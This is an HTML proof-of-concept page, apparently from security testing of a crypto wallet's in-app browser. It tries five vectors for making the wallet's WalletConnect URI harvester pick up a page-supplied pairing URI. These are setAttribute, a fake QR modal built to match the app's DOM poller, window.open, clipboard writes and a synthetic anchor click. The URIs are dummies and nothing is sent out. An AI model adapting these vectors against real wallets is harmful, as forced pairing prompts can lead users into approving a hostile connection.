<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>wc-uri-poc</title>
<style>
  body { font-family: -apple-system, monospace; background:#111; color:#eee; padding:16px; }
  button { display:block; width:100%; padding:14px; margin:8px 0; font-size:14px; background:#222; color:#0f0; border:1px solid #444; }
  #log { white-space:pre-wrap; font-size:11px; background:#000; padding:10px; border:1px solid #333; min-height:120px; margin-top:12px; word-break:break-all; }
  .uri { color:#0af; }
</style>
</head>
<body>
<h3>wc: URI harvester test</h3>
<div id="log">waiting...\n</div>

<button onclick="run('setattr')">1. setAttribute vector</button>
<button onclick="run('poller')">2. DOM poller vector (qrcode tag)</button>
<button onclick="run('open')">3. window.open vector</button>
<button onclick="run('clip')">4. clipboard.writeText vector</button>
<button onclick="run('anchor')">5. anchor click vector</button>

<script>
var logEl = document.getElementById('log');
function log(m) {
  logEl.textContent += m + '\n';
  logEl.scrollTop = logEl.scrollHeight;
}

log('bridge present: ' + (typeof window.ReactNativeWebView !== 'undefined'));
log('saucerswapWallet present: ' + (typeof window.saucerswapWallet !== 'undefined'));

// distinct dummy topic per vector so you can match which one fired if
// native logging / mitmproxy shows the resulting postMessage or relay call
function fakeUri(tag) {
  var pad = tag.padEnd(8, '0').slice(0,8);
  return 'wc:' + pad + 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@2?relay-protocol=irn&symKey=' + '1'.repeat(64);
}

function run(vector) {
  var uri = fakeUri(vector);
  log('--- triggering [' + vector + '] ---');
  log('<span class="uri">' + uri + '</span>');

  try {
    if (vector === 'setattr') {
      var el = document.createElement('div');
      document.body.appendChild(el);
      el.setAttribute('data-uri', uri);
      log('setAttribute called on a plain <div>, no walletconnect class/id needed');
    }

    else if (vector === 'poller') {
      // mimic real WC modal shape so the poller's searchForWcUri finds it:
      // outer container needs class/id matching *walletconnect*, inner
      // element needs tag containing "qrcode" (or w3m-qr-code/wcm-qrcode)
      // exposing uri via getAttribute('uri')/('data-uri')/.uri/.value
      var outer = document.createElement('div');
      outer.className = 'walletconnect-fake-modal';
      var inner = document.createElement('div');
      inner.setAttribute('data-tag', 'fake-qrcode-holder');
      // fake custom element name containing "qrcode" so tagName check matches
      var qr = document.createElement('fake-wcm-qrcode');
      qr.setAttribute('uri', uri);
      inner.appendChild(qr);
      outer.appendChild(inner);
      document.body.appendChild(outer);
      log('injected fake w3m/wcm-style modal, waiting up to 500ms for poller...');
    }

    else if (vector === 'open') {
      var ret = window.open(uri);
      log('window.open returned: ' + ret);
    }

    else if (vector === 'clip') {
      navigator.clipboard.writeText(uri)
        .then(function(){ log('clipboard.writeText resolved'); })
        .catch(function(e){ log('clipboard.writeText rejected: ' + e); });
    }

    else if (vector === 'anchor') {
      var a = document.createElement('a');
      a.href = uri;
      a.style.display = 'none';
      document.body.appendChild(a);
      a.click();
      log('synthetic anchor click dispatched');
    }
  } catch (e) {
    log('ERROR: ' + e);
  }

  log('watch native side (mitmproxy / wallet UI) for a pairing prompt or postMessage with this URI');
}
</script>
</body>
</html>
